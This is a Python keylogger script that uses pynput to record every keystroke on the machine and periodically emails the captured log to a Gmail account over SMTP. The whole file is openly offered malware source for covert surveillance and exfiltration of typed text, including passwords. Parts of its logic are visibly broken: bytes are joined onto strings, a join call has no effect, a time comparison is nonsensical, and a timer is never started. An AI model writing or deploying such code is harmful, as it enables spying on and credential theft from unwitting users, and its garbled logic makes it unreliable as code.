import pynput
import smtplib
import time
import threading
from time import localtime, strftime


log = ""
mail_head = ""


def listener(key):
    global log
    key_dict = {key.space: " ", key.enter: " [ENTER] ", 
                key.backspace: " [BACKSPACE] ", key.ctrl_l: " [CTRL] ", 
                key.ctrl_r: " [CTRL] ", key.shift: " [SHIFT] ",
                key.shift_r: " [SHIFT] ", key.delete: " [DELETE] ", 
                key.esc: " [ESC] ", key.tab: " [TAB] ", 
                key.up: " [UP] ", key.down: " [DOWN] ",
                key.left: " [LEFT] ", key.right: " [RIGHT] ", 
                key.cmd: " [WINDOWS-KEY] ", key.cmd_r: " [WINDOWS-KEY] ", 
                key.f1: " [F1] ", key.f2: " [F2] ",
                key.f3: " [F3] ", key.f4: " [F4] ", 
                key.f5: " [F5] ", key.f6: " [F6] ", 
                key.f7: " [F7] ", key.f8: " [F8] ", 
                key.f9: " [F9] ", key.f10: " [F10] ", 
                key.f11: " [F11] ", key.f12: " [F12] ", 
                key.alt_l: " [ALT] ", key.alt_r: " [ALT] ",
                key.caps_lock: " [CAPSLOCK] ", key.home: " [HOME] "
                }

    try:
        log = "Line :" + log + key.char.encode("UTF-8")

    except AttributeError:
        if key not in key_dict.keys():
            log += " " + str(key) + " "

        else:
            # log += str(key_dict.get(key))
            log.join(key_dict.get(key))


def hour_wait():
    global mail_head

    start = strftime("%d.%m.%Y - %H:%M:%S", localtime())

    x = 1800
    time.sleep(x)

    finish = strftime("%d.%m.%Y - %H:%M:%S", localtime())

    if int(int(finish[17]) - int(start[17])) == x:
        mail_head = finish


def mail_send(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


def thread_all():
    global log
    global mail_head

    log_msg = (f"""
    Date : {mail_head} \n\n

Captured : {log}
""")

    mail_send("", "", log_msg)
    log = ""

    threading.Timer(600, thread_all)


keylogger = pynput.keyboard.Listener(on_press=listener)

with keylogger:
    keylogger.join()
    hour_wait()
    thread_all()
